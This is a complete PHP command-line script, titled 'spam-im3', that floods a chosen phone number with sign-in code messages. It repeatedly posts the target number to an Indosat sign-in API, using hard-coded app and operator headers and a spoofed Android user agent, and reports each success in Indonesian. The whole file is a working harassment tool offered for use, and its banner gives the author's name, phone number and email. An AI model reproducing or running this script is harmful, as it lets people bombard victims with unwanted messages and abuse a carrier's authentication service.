<?php
$banner = "\e[36;1m                                 _           _____
 ___ _ __   __ _ _ __ ___       (_)_ __ ___ |___ /
/ __| '_ \ / _` | '_ ` _ \ _____| | '_ ` _ \  |_ \
\__ \ |_) | (_| | | | | | |_____| | | | | | |___) |
|___/ .__/ \__,_|_| |_| |_|     |_|_| |_| |_|____/
    |_|
\e[36;1m======================================================
\033[1;32mAuthor Oleh\033[1;31m :\033[1;0mWahyu Sibran
\033[1;32mContac \033[1;31m     :\033[1;0m087730882553
\033[1;32mEmail \033[1;31m      :\033[1;0mWakhyus@gmail.com
";
echo $banner;
echo "\n\n\n";
echo "\e[0;1m>>> Nomor Target\n(ex : 6285xxxxxxxxx) : ";
$target = trim(fgets(STDIN));
sleep(2);
echo ">>> jumlah\nMasukan jumlah : ";
$jum = trim(fgets(STDIN));
for ($i=1; $i <= $jum; $i++) {
$header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
$post = array("msisdn" => "$target");
$data = json_encode($post);
$g = curl_init();
curl_setopt($g, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($g, CURLOPT_POST, 1);
curl_setopt($g, CURLOPT_HEADER, 1);
curl_setopt($g, CURLOPT_POSTFIELDS, $data);
curl_setopt($g, CURLOPT_HTTPHEADER, $header);
curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
$h = curl_exec($g);
curl_close($g);

preg_match("/challengeId/i", $h, $respon);
if ($respon[0] == "challengeId") {
	echo $i. ".Gass Terus Cok !!!\n";
	}else{
		echo $i. "Gagal bosku\n";
		}
	}

?>
